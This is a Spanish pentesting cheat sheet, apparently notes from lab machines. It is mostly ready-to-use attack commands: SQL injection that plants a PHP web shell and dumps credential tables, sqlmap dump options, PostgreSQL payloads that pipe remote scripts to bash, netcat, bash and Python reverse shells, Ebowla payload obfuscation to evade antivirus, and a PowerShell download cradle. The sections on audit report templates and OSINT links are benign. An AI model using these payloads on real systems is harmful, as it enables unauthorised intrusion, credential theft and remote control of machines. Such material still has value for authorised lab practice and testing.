- Para depositar un contenido en una ruta concreta del sistema:
```bash
' union select "<?php echo system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/shell.php"-- -
```
- Para enumerar todas las tablas después de haber encontrado una posible vulnerabilidad sql inyection desde Burpsuite:
```bash
for i in $(seq 0 90); do echo "[+] Para el número $i: $(curl -s -X POST http://10.10.11.130/login --data "email=to%40tom.com' union select 1,2,3,table_name from information_schema.tables limit $i,1-- -&password=%27" | grep "Welcome")"; done
```
- Para enumerar todas las columnas de la tabla user:
```bash
for i in $(seq 0 90); do echo "[+] Para el número $i: $(curl -s -X POST http://10.10.11.130/login --data "email=to%40tom.com' union select 1,2,3,column_name from information_schema.columns where table_name=\"user\" limit $i,1-- -&password=%27" | grep "Welcome")"; done
```
- Para extraer los datos de unas columnas encontradas:
```bash
for i in $(seq 0 90); do echo "[+] Para el número $i: $(curl -s -X POST http://10.10.11.130/login --data "email=to%40tom.com' union select 1,2,3,group_concat(email,0x3a,id,0x3a,password,0x3a,name) from user limit $i,1-- -&password=%27" | grep "Welcome")"; done 
```
#### SQLMAP
- Fuente: https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
- Podemos empezar asi:
```bash
sqlmap -u "http://192.168.11.129/sqli/example2.php?name=user1" --dbs
--level=3 --risk=3 # Añadir, modificación sugerida por la herramienta
--tamper=space2comment # Añadir, modificación sugerida por la herramienta
```
##### Opciones sqlmap:
```bash
sqlmap -u "http://demo.ine.local/sqli_1.php?title=hello&action=search" --cookie "PHPSESSID=m42ba6etbktfktvjadijnsaqg4; security_level=0" -p title --dbs -D bWAPP -T users -C admin,password,email --dump # Este es un ejemplo con todos los datos añadidos
--dbs # Añadir esto para saber el nombre de las bases de datos
-D <NOMBREBASEDATOS> --tables # Añadir esto para saber el nombre de las tablas
-T users --columns # Añadir esto para saber el nombre de las columnas de la tabla users
-C admin,password,email --dump # Añadir esto para todos los datos de las columnas selecionadas

--auth-type="basic" --auth-cred="tom@book.htb:tom123" 
-p title # Para comprobar el parámetro title

--cookie='custom_cart={"*":"1"}' # Si cambiamos el contenido de un campo por un *, sqlmap prueba inyecciones en ese campo 
--flush --fresh-queries # Evitar el almacenamiento de cache u otras modificaciones realizadas en la sesión de un usuario

--dump
--dump-all # Para dumpear todo pongo esto al final
--batch # Para que no me pregunte que quiero hacer y que elija la mejor opción pongo esto al final
```
- sqlmap por post:
```bash
sqlmap -u "http://10.10.11.130/login" -data "email=casa%40osticket.com&password=gggg" --dbs
``` 
### Nosql Injection
- Para explotar una inyección Nosql, primero intento buscar el punto en el que se puede producir la inyección probando algunos payloads, mirar:
```bash
Fuente: https://book.hacktricks.xyz/pentesting-web/nosql-injection
Fuente:  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
```
Es importante probar tanto opciones en DATA como en JSON (cambiar el Content-Type a application/json). Este tipo de inyecciones pueden darse en servicios como node.js.
### PostgreSQL Injection
- Para explotar una inyección PostgreSQL, primero intento buscar el punto en el que se puede producir la inyección probando algunos payloads, mirar: https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection
```bash
';select pg_sleep(10);-- - # Comprobar si es vulnerable

> Segun la version quu sea podemos conseguir un RCE - Probar también con url encode.
';CREATE TABLE cmd_exec(cmd_output text);-- - # Crear una tabla

# Diferentes formas para ver si tengo un RCE:
';COPY cmd_exec FROM PROGRAM 'curl http://10.10.14.3/test';-- -
';COPY cmd_exec FROM PROGRAM 'curl 10.10.14.3/test';-- -
';COPY cmd_exec FROM PROGRAM 'ping 10.10.14.3';-- -

# Si tengo un RCE puedo compartirme un nc.exe con impacket-smbseerver y conseguir una reverse shell en Windows
';COPY cmd_exec FROM PROGRAM '\\10.10.14.3\smbFolder\nc.exe -e cmd 10.10.14.3 443';-- -

# O también en Linux
bash -i >& /dev/tcp/10.10.14.3/443 0>&1 # Creo un index.html con este contenido, me comparto un servidor con python y me pongo en escucha
';COPY cmd_exec FROM PROGRAM 'curl 10.10.14.3|bash';-- - # Después lanzo esta petición en la inyección
```
### Time based OTPs
- Si tengo problemas con un token TOTP, y al mirar la hora de mi sistema y la hora de la máquina objetivo no son la misma, puedo intentar generar un token correcto:
```bash
date # Ver la hora de mi sistema
curl -s -X GET http://10.10.10.246:8080/vpn/login.php -i | grep "Date" # Ver la hora de la máquina objetivo
pip3 install pyotp ntplib # Instalar
```
- Script GetOTPToken.py. Lanzar el script para obtener el token TOTP:
```bash
#!/usr/bin/python3

import pyotp
import ntplib
from time import ctime

client = ntplib.NTPClient()
response = client.request("10.10.10.246")
totp = pyotp.TOTP("orxxi4c7orxwwzlo")
print("El token es:", totp.at(response.tx_time))
```
- Otra forma de conseguir un código válido:
```bash
# Instalo la extensión de Firefox: https://authenticator.cc/
Ahora copio el código que tengo "orxxi4c7orxwwzlo", en Lapiz > Añadir > Manual Entry. Pego el código que tengo en el apartado Secret y obtendre un código que puede ser válido
```
## Ebowla
```bash
> Instalar los módulos necesarios:
pip install pycrypto
pip install ConfigObj

> Clonar Ebowla:
git clone https://github.com/Genetic-Malware/Ebowla 
cd Ebowla # Muevo el binario que quiero modificar a la carpeta Ebowla

> Modifico el archivo genetic.config:

output_type = GO
payload_type = EXE

> Incorporo las variables del equipo al archivo genetic.config:

    [[ENV_VAR]]

        username = 'svc_deploy' # echo %username%
        computername = 'DC01' # echo %computername%
        homepath = ''
        homedrive = ''
        Number_of_processors = '2' # echo %Number_of_processors%
        processor_identifier = 'AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD' # echo %processor_identifier%
        processor_revision = '3100' # echo %processor_revision%
        userdomain = 'TIMELAPSE' # echo %userdomain%
        systemdrive = ''
        userprofile = ''
        path = 'C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\svc_deploy\AppData\Local\Microsoft\WindowsApps' # echo %path%
        temp = 'C:\Users\SVC_DE~1\AppData\Local\Temp' # echo %temp%

     [[PATH]]

python ebowla.py file.exe genetic.config # Lo ejecuto para crear el .go

> Compilar el archivo .go:

go_symmetric_file.exe.go # Ejemplo .go
./build_x64_go.sh ./output/go_symmetric_file.exe.go mybinary.exe # Lo ejecuto para generar el .exe

> Subo el binario a la máquina y lo ejecuto:

upload /home/kali/Desktop/mybinary.exe
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.19/mybinary.exe')

.\mybinary.exe # Lo ejecuto
```
## Informe Auditoría
### Ejemplos y plantillas
```bash
https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report
https://pentestreports.com/templates/
https://github.com/juliocesarfort/public-pentesting-reports
```
### Tools CVE CVSS
```bash
https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator # Calculadora CVSS3.0
https://nvd.nist.gov/vuln/search # Buscar CVE
https://www.cvedetails.com/ # Buscar CVE
```
## Otras cosas
### Port knocking
Ejemplo:
```bash
for port in 40809 50212 46969; do echo "test" | nc -u -w 1 10.10.10.96 $port; done; nmap -p22 --open -v -n 10.10.10.96
```
### Descarga de contenido:
- Ejemplo de descarga de contenido recursiva con 3 for anidados:
```bash
for year in {2020..2022}; do for mounth in {01..12}; do for day in {01..31}; do wget "http://10.10.10.248/documents/$year-$mounth-$day-upload.pdf"; done; done; done
```
-Ejemplo de descarga de contenido recursiva con 3 for anidados y con hilos:
```bash
for year in {2020..2022}; do for mounth in {01..12}; do for day in {01..31}; do echo "http://10.10.10.248/documents/$year-$mounth-$day-upload.pdf"; done; done; done | xargs -n 1 -P 20 wget
```
### Otros Comandos
- Conectar VPN: `sudo openvpn NOMBRE.ovpn`. Desconectar: `sudo killall openvpn`
- Para pasar la dirección `ipv6` a un formato que podamos utilizar:
```bash
de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:0b:4a # Primero lo unimos en grupos de 4 y pasariamos de esto
dead:beef:0000:0000:0250:56ff:feb9:0b4a # A esto. Esto ya sería funcional
dead:beef::250:56ff:feb9:b4a # Pero puedo quitar los grupos de ceros y los ceros a la izquierda y quedaría así

# Si quiero ver en el navegador un servicio http por ipv6 tengo que poner la direccion entre corchetes: [dead:beef::250:56ff:feb9:b4a]
```
- Para entablarme una reverse shell por IPv6 con Python:
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("dead:beef:2::1010",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' # Equipo objetivo

nc -nv --listen dead:beef:2::1010 443 # Mi equipo
```
### Instalar Impacket con Python2 en Pyenv
Pasos para instalar Impacket con Python2 en Pyenv en la versión Kali Linux 2022.2:
```bash
sudo apt install -y build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python3-openssl git
curl https://pyenv.run | zsh
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.zshrc
echo 'export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.zshrc
echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init --path)"\nfi' >> ~/.zshrc
exec $SHELL
pyenv
pyenv install 2.7.18
pyenv global 2.7.18
pyenv versions
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
chmod +x get-pip.py
python2 get-pip.py install impacket

> Fuentes:
https://www.kali.org/docs/general-use/using-eol-python-versions/
https://unix.stackexchange.com/questions/654723/cant-install-python2-modules-kali-2020
https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point
```
- Otros:
```bash
traceroute <DOMINIO> # Ver los saltos/nodos desde mi ping hasta el dominio objetivo, trazar una ruta
sublist3r -v -d <DOMINIO> # Busca subdominios en los buscadores de internet
theHarvester -d <DOMINIO> -l 100 -b google # Recolectar emails del objetivo desde una busqueda en google
ip: <IP> # Ver los dominios que comparten ip. Poner esto en Bing
```
### Links
#### Cracking
- https://www.onlinehashcrack.com/
- https://crackstation.net/
- https://www.hackingarticles.in/password-dumping-cheatsheet-windows/

#### Exploit database
- https://sploitus.com/
- https://www.exploit-db.com/
- https://www.rapid7.com/db/

#### Tools
- https://gchq.github.io/CyberChef/
- https://www.w3schools.com/tags/ref_urlencode.ASP
- https://www.pentesterlab.com/exercises/web_for_pentester/course
- https://gtfobins.github.io/ # Linux
- https://lolbas-project.github.io/# # Windows

#### OSINT

- https://intelx.io/
- https://ciberpatrulla.com/
- https://osintframework.com/
- https://publicwww.com/
- https://hunter.io/
- https://viz.greynoise.io/
- https://pulsedive.com/
- Maltego (Terminal)
- sudo owasp-mantra-ff (Terminal)

#### Google Dorks

- https://www.exploit-db.com/google-hacking-database
- https://dorksearch.com/
- https://www.udemy.com/course/curso-completo-de-hacking-etico-y-ciberseguridad/learn/lecture/24421094#overview

#### Shodan

- https://github.com/jakejarvis/awesome-shodan-queries
- https://www.udemy.com/course/curso-completo-de-hacking-etico-y-ciberseguridad/learn/lecture/24425352#overview

#### Metadatos

- Foca (metadatos)
- Analizador de metadatos online: https://metashieldclean-up.elevenpaths.com/

#### Otros

- https://www.pentesterlab.com/exercises/web_for_pentester/course
- https://github.com/samratashok/nishang/tree/master/Shells
- https://github.com/swisskyrepo/PayloadsAllTheThings

#### Extensiones
- Extensión para ver y editar las cookies de una web: `Cookie-Editor`
- Extensión para capturar el trafico web con Burpsuite: `Foxy proxy`
- Extensión para saber como esta hecha una web: `wappalyzer`
- Extensión para ver los datos de un dominio: `IP Address and Domain Information`
